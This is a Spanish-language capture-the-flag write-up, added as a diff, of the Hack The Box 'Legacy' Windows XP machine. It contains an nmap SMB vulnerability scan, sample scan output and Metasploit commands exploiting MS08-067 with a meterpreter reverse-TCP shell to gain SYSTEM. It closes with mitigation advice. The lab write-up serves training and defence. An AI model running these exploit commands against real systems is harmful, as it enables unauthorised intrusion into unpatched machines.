@@ -1,0 +1,81 @@
+# HTB Legacy - Writeup Profesional
+
+![Hack The Box](https://img.shields.io/badge/HackTheBox-Legacy-green?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-Windows_XP-blue?style=for-the-badge)
+![Category](https://img.shields.io/badge/Category-Exploitation-red?style=for-the-badge)
+
+Introducción:
+Legacy es una máquina de Hack The Box de dificultad sencilla que ilustra los riesgos de mantener sistemas operativos obsoletos. En esta auditoría, se explotan vulnerabilidades críticas en el servicio SMB.
+
+#Metodología Técnica
+
+### 1. Enumeración de Red
+El escaneo inicial con `nmap` reveló los puertos 135, 139 y 445 abiertos. El puerto 445 (SMB) se identificó como el vector de ataque principal.
+
+```bash
+nmap -sV -p 135,139,445 --script smb-os-discovery,smb-vuln* 10.129.33.252
+
+Hallazgos:
+
+SO: Windows XP SP3.
+
+Vulnerabilidades detectadas: MS08-067 (RCE) y MS17-010 (EternalBlue).
+
+Explotación:
+Se utilizó el framework Metasploit para aprovechar la vulnerabilidad MS08-067 (CVE-2008-4250), debido a su alta fiabilidad en sistemas Windows XP.
+
+Módulo: exploit/windows/smb/ms08_067_netapi
+
+Payload: windows/meterpreter/reverse_tcp
+
+msfconsole
+use exploit/windows/smb/ms08_067_netapi
+set RHOSTS 10.129.33.252
+set LHOST tun0
+run
+
+Post-Explotación:
+Tras la ejecución exitosa, se obtuvo una shell de Meterpreter con privilegios de sistema.
+
+Identidad: NT AUTHORITY\SYSTEM
+
+User Flag: C:\Documents and Settings\john\Desktop\user.txt
+
+Root Flag: C:\Documents and Settings\Administrator\Desktop\root.txt
+
+### 2. Archivo: `nmap_scan.txt`
+*(Crea un nuevo archivo y pega el output real que obtuviste para darle autenticidad)*
+
+```text
+# Nmap scan report for 10.129.33.252
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows XP microsoft-ds
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   Computer name: legacy
+|_  Workgroup: HTB
+| smb-vuln-ms08-067: 
+|   VULNERABLE: Remote code execution (MS08-067)
+|   State: VULNERABLE
+|   IDs:  CVE:CVE-2008-4250
+
+Recomendaciones y Mitigación:
+Para prevenir este tipo de ataques en una infraestructura real, se deben aplicar las siguientes medidas:
+
+Actualización Urgente: Migrar los activos a versiones de Windows con soporte actual (Windows 10/11 o Server 2022/2025).
+
+Desactivación de SMBv1: SMBv1 es un protocolo inseguro. Debe deshabilitarse a través de directivas de grupo (GPO) o el registro de Windows.
+
+Segmentación de Red: En caso de que el sistema sea imprescindible 
+(p. ej., maquinaria industrial), debe aislarse en una VLAN sin acceso a internet y con reglas de firewall de "denegación por defecto".
+
+IDS/IPS: Implementar sistemas de detección de intrusos para identificar patrones de tráfico RPC malformados asociados a estos CVEs.
+
+Conclusión
+La máquina Legacy es un recordatorio de que la seguridad no es un estado estático, sino un proceso. 
+La persistencia de vulnerabilidades con casi 20 años de antigüedad en redes internas sigue siendo uno de los vectores más comunes para el despliegue de Ransomware en la actualidad.
+
